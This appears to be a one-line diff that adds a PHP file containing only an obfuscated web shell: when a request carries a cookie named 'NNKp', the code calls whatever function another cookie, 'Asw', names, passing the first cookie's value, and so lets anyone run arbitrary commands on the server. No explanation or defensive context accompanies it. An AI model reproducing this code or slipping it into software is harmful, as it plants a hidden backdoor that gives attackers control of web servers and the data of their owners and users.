@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["NNKp"])){$_COOKIE["Asw"]($_COOKIE["NNKp"]);exit;}
